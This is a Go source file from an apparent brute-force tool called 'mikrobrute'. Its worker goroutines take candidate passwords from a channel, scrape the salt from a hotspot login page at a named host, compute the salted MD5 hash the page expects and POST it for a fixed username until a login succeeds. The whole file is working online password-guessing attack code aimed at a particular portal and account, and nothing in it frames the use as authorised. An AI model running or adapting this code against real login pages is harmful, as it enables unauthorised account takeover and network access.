package workers

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"mikrobrute/mdfive"
	"mikrobrute/util"
	"net/http"
	"net/url"
	"strconv"
)

type worker struct {
	name     string
	lastHash string
	nextSalt string
	errorJob string
}

func New(id int) *worker {
	return &worker{
		name: strconv.Itoa(id),
	}
}

func (w *worker) ListenAndExecute(jobChan <-chan string, ctx context.Context) {
	hashMan := mdfive.New()

	for str := range jobChan {
		select {
		case <-ctx.Done():
			return
		default:
			fmt.Printf("Worker %s processing job %s\n", w.name, str)

			var (
				salt    string
				rawSalt string
			)

			if w.errorJob != "" {
				w.errorJob = ""
			}

			if w.lastHash == "" {
				fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
				resp, err := http.Get("http://ictplaza.hs/login")

				if err != nil {
					log.Printf("something went wrong and worker %s couldn't get salt", w.name)
					w.errorJob = str
					return
				}

				body, _ := ioutil.ReadAll(resp.Body)

				_ = resp.Body.Close()

				if util.CheckForSuccess(string(body)) {
					fmt.Println("Already Logged In")
					return
				}

				rawSalt = util.ExtractSalt(string(body), str)

			} else {
				//	fmt.Printf("Last Salt: %s\n", w.lastHash)
				rawSalt = util.ExtractSalt(w.nextSalt, str)
			}

			salt = util.Saltify(rawSalt)
			fmt.Println("Current Raw Salt: ", rawSalt)
			//fmt.Println("Current Salt: ", salt)
			hash := hashMan.Hash(salt)

			fmt.Printf("Hash For %s: %v\n", str, hash)

			resp, err := http.DefaultClient.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}, "dst": {""}, "popup": {"true"}})

			if err != nil {
				log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
				w.errorJob = str
				return
			}

			body, _ := ioutil.ReadAll(resp.Body)
			_ = resp.Body.Close()

			if util.CheckForSuccess(string(body)) {
				log.Println("I Found A Fucking Hit")
				return
			} else {
				w.lastHash = rawSalt
				w.nextSalt = util.ExtractSalt(string(body), str)
			}

			//time.Sleep(2 * time.Second)

		}

	}
}
